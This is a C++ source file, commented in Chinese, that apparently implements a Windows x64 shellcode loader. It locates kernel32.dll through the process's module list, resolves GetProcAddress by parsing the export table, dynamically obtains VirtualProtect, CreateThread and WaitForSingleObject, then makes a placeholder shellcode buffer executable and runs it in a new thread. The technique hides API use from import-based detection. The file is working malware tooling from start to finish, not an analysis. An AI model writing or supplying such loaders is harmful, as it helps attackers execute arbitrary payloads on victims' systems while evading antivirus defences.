#include <stdio.h>
#include <windows.h>

// UNICODE_STRING 结构体定义
typedef struct _UNICODE_STRING {
    USHORT Length;  //表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节
    USHORT MaximumLength;  //分配的内存空间的大小，以字节为单位
    PWSTR Buffer;  //表示指向存储Unicode字符串的字符数组的指针
} UNICODE_STRING, * PUNICODE_STRING;

// 声明获取 InInitializationOrderModuleList 链表的函数
extern "C" PVOID64 __stdcall GetInInitializationOrderModuleList();

// 获取 Kernel32.dll 的基地址
HMODULE getKernel32Address() {
    // 获取 InInitializationOrderModuleList 链表
    LIST_ENTRY* pNode = (LIST_ENTRY*)GetInInitializationOrderModuleList();
    while (1) {
        // 获取 FullDllName 成员
        UNICODE_STRING* FullDllName = (UNICODE_STRING*)((BYTE*)pNode + 0x38);
        // 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll
        if (*(FullDllName->Buffer + 12) == '\0') {
            // 返回模块的基地址
            return (HMODULE)(*((ULONG64*)((BYTE*)pNode + 0x10)));
        }
        pNode = pNode->Flink;
    }
}

// 获取 GetProcAddress 函数的地址
DWORD64 getGetProcAddress(HMODULE hKernal32) {
    // 获取 DOS 头
    PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernal32;
    // 获取 NT 头
    PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr->e_lfanew);
    // 获取导出表
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    // 获取导出函数地址数组、导出函数名数组和导出函数序号数组
    PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir->AddressOfFunctions);
    PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir->AddressOfNames);
    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir->AddressOfNameOrdinals);

    // 遍历导出函数
    for (size_t i = 0; i < exportDir->NumberOfNames; i++) {
        // 获取当前函数地址
        LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);
        // 获取当前函数名地址
        PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]);
        // 如果当前函数名是 "GetProcAddress"，返回其地址
        if (!strcmp((const char*)FunctionName, "GetProcAddress")) {
            return F_va_Tmp;
        }
    }
}

// 定义函数指针类型
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);

int main() {
    // 定义包含 shellcode 的缓冲区
    unsigned char buf[] =
        "填写x64的shellcode";

    // 获取 Kernel32.dll 的基地址和GetProcAddress函数地址
    HMODULE hKernal32 = getKernel32Address(); // 获取Kernel32.dll的基地址
    pGetProcAddress GetProcAddress = (pGetProcAddress)getGetProcAddress(hKernal32); // 获取GetProcAddress函数地址
    
    //获取其他所需API函数地址
    pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32, "VirtualProtect");
    pCreateThread CreateThread = (pCreateThread)GetProcAddress(hKernal32, "CreateThread");
    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)GetProcAddress(hKernal32, "WaitForSingleObject");
    
    //修改shellcode缓冲区的内存保护属性，以便执行
    DWORD oldProtect;
    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &oldProtect);
    
    //创建新线程执行shellcode并等待其执行完成
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}